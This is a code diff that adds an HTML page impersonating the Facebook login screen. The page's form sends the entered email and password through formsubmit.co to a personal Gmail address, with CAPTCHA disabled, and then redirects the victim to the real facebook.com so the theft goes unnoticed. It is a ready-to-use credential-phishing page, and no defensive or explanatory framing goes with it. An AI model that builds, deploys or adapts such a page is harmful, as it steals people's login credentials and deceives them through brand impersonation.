@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Log In</title>
+  <link rel="stylesheet" href="./style.css"> <!-- Pastikan file ini ada -->
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>facebook</h1>
+    </div>
+    <form class="login-form" id="loginForm" action="https://formsubmit.co/mfsavana@gmail.com" method="POST">
+      
+      <!-- Anti-spam hidden inputs -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_next" value="https://www.facebook.com">
+      
+      <!-- Form fields -->
+      <input type="email" id="email" name="Email" placeholder="Email address or phone number" required>
+      <input type="password" id="password" name="Password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+      <a href="#">Forgotten password?</a>
+      <hr>
+      <button type="button" class="signup">Create New Account</button>
+    </form>
+  </div>
+
+  <script src="./script.js"></script> <!-- Pastikan file ini ada -->
+</body>
+</html>
